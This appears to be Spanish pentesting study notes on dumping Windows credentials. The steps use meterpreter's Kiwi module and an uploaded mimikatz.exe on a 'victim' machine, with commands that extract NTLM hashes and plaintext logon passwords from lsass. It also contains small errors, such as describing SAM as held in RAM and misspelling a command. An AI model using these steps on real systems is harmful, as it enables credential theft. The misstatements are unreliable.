SAM es una base de datos en windows dónde se almacenan las credenciales de los usuarios. Esta base de datos está en memoria RAM. El proceso lsass.exe, el cuál se encarga de la autenticación de los usuarios, interactúa con la SAM y guarda en una caché los hashes NTLM de los usuarios. 
Mediante la herramienta de Mimikatz podremos extraer estos hashes de la memoria del proceso lsass.exe. También si tenemos una sessión de meterpreter podemos usar el módulo mimi de meterpreter.

Requisitos:
Tener una sessión con usuario que pertenezca al localgroup administrators.

## Kiwi meterpreter module
1. En una sesion meterpreter escribímos `load kiwi`
2.  Abrimos con `?` el menú de ayuda de meterpreter.
3. Distintos comandos, con creds_all obtenemos todo, con lsas_dump_sam obtenemos los hashes NTLM de los usuarios.
## Mimikatz precompiled executable
1. Vamos a C:\ en la máquina víctima y creamos, si no existe, directorio Temp.
2. `upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe`
3. abrimos desde meterpreter una shell normal con comando `shell`
4. Ejecutamos `.\mimikatz.exe` Se nos abrirá la consola de mimikatz
5. Comprobamos que tenemos los privilegios necesarios para extraer los hashes del proceso lsass.exe usando esta herramienta con el comando: `privilege::debug`. Si nos da el OK podemos.
### Comandos de mimikatz
-  `lsadump::sam` -> Extrae los hashes NTLM de los usuarios
-  `lsadump::secrets`
-  `sekurlsa::logonpasswords`   Si un usuario logea en windows, si este ha sido configurado para guardar en memoria contraseñas usadas para logear, mimikatz puede mostrarte estas contraseñas en texto plano.
